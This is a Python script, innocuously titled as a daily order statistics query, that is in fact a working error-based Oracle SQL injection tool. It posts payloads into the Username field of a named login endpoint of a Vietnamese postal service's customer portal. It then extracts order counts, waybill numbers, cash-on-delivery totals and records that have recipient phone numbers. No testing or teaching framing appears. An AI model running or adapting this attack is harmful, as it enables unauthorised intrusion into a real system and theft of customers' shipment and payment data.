#!/usr/bin/env python3
"""
查询当天订单统计
"""

import requests
import json
import time

class OrderQuery:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def query_today_orders(self):
        """查询当天订单统计"""
        print("=" * 80)
        print("📊 2025-10-10 订单统计查询")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("E1E2_PH表（脱敏表）总订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("E1E2_PH表 - 不同的MABC数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("E1E2_PH表 - 有电话的订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            
            ("E1E2_PH表 - 有代收金额的订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND SO_TIEN_THU_HO>0"),
            
            ("SHIPMENT表 - 当天订单数", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("E1E2_PH_TEMP_DATA2_LOG - 当天订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            print(f"   SQL: {query}")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 数量: {result}")
                results[name] = result
            else:
                print(f"   ❌ 查询失败")
                results[name] = "查询失败"
            time.sleep(1.5)
        
        return results
    
    def query_sample_orders(self):
        """查询样本订单"""
        print("\n" + "=" * 80)
        print("📋 样本订单数据")
        print("=" * 80)
        
        date = '20251010'
        
        # 查询前5个MABC
        print("\n🔎 前5个运单号:")
        for i in range(1, 6):
            query = f"SELECT MABC FROM (SELECT DISTINCT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}') WHERE RN={i}"
            mabc = self.extract_via_error(query)
            if mabc:
                print(f"   {i}. MABC: {mabc}")
            time.sleep(1)
        
        # 查询有电话的样本
        print("\n🔎 有电话的样本订单:")
        query = f"SELECT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM<=3"
        result = self.extract_via_error(query)
        if result:
            print(f"   样本MABC: {result}")
        
        time.sleep(1)
        
        # 查询有代收的样本
        print("\n🔎 有代收金额的样本订单:")
        query = f"SELECT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND SO_TIEN_THU_HO>0 AND ROWNUM<=3"
        result = self.extract_via_error(query)
        if result:
            print(f"   样本MABC: {result}")
    
    def query_data_distribution(self):
        """查询数据分布"""
        print("\n" + "=" * 80)
        print("📈 数据完整度分析")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("MABC最小值", 
             f"SELECT MIN(MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("MABC最大值", 
             f"SELECT MAX(MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("代收金额总计", 
             f"SELECT SUM(SO_TIEN_THU_HO) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("最大代收金额", 
             f"SELECT MAX(SO_TIEN_THU_HO) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("COD订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND CUOC_COD>0"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
    
    def run_all_queries(self):
        """运行所有查询"""
        print("=" * 80)
        print("📊 当天订单统计工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行查询
        results = self.query_today_orders()
        self.query_sample_orders()
        self.query_data_distribution()
        
        # 总结
        print("\n" + "=" * 80)
        print("📊 统计总结")
        print("=" * 80)
        
        for name, value in results.items():
            print(f"  • {name}: {value}")
        
        print("\n" + "=" * 80)
        print("🎉 查询完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    query = OrderQuery(target_url)
    query.run_all_queries()
